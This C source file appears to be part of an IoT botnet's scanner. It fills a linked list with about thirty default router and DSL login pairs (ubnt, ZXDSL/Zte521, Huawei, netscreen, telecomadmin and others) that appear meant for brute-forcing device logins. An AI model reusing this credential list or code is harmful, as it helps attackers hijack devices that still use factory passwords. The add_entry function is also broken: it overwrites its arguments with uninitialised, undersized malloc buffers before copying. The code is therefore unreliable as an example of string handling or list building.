#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "headers/login.h"

void add_entry(char *user, char *pass) {
    login_t *last = list_head, *node = calloc(1, sizeof(login_t));

    user = (char *)malloc(strlen(user)), pass = (char *)malloc(strlen(pass));
    node->next = NULL;

    strncpy(node->user, user, strlen(user));
    strncpy(node->pass, pass, strlen(pass));

    if(list_head == NULL) {
        node->prev = NULL;
        list_head = node;

        return;
    }

    while(last->next != NULL)
        last = last->next;
    
    last->next = node;
    node->prev = last;
}

void login_init(void) {
    add_entry("on", "on");
    add_entry("admin", "");
    add_entry("ubnt", "ubnt");
    add_entry("root", "ubnt");
    add_entry("root", "root");
    add_entry("user", "user");
    add_entry("1234", "1234");
    add_entry("root", "admin");
    add_entry("admin", "1234");
    add_entry("guest", "guest");
    add_entry("admin", "admin");
    add_entry("admin", "12345");
    add_entry("ZXDSL", "ZXDSL");
    add_entry("root", "Zte521");
    add_entry("Admin", "Admin");
    add_entry("Admin", "admin");
    add_entry("admin", "abc123");
    add_entry("admin", "peribit");
    add_entry("admin", "password");
    add_entry("root", "W!n0&oO7.");
    add_entry("redline", "redline");
    add_entry("support", "support");
    add_entry("user", "HuaweiUser");
    add_entry("admin", "netscreen");
    add_entry("serial#", "serial#");
    add_entry("digicell", "digicell");
    add_entry("vodafone", "vodafone");
    add_entry("zywfp", "PrOw!aN_fXp");
    add_entry("netsreen", "netscreen");
    add_entry("telecomadmin", "admintelecom");
    add_entry("admin", "<<< %%s(un='%%s') = %%u.");
}
